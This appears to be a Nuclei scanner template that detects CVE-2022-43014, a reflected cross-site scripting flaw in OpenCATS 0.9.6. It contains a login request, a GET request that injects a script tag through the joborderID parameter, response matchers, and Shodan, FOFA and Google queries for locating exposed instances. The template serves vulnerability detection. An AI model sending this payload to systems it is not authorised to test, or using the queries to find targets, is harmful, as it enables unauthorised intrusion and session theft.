http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - CATS=
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?m=login&a=attemptLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'GET /ajax.php?f=getPipelineJobOrder&joborderID=1)"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-43014
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:opencats:opencats:0.9.6:*:*:*:*:*:*:*
    cve-id: CVE-2022-43014
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.81691
    epss-score: 0.01677
  description: 'OpenCATS 0.9.6 contains a cross-site scripting vulnerability via the
    joborderID parameter. An attacker can inject arbitrary script in the browser of
    an unsuspecting user in the context of the affected site. This can allow the attacker
    to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: title="opencats"
    google-query: intitle:"opencats"
    max-request: 2
    product: opencats
    shodan-query:
    - title:"OpenCATS"
    - http.title:"opencats"
    vendor: opencats
    verified: true
  name: OpenCATS 0.9.6 - Cross-Site Scripting
  reference:
  - https://github.com/hansmach1ne/opencats_zero-days/blob/main/XSS_in_joborderID.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43014
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/Henry4E36/POCS
  remediation: 'Upgrade to a patched version of OpenCATS or apply the necessary security
    patches provided by the vendor.

    '
  severity: medium
  tags: cve2022,cve,xss,opencats,authenticated,vuln
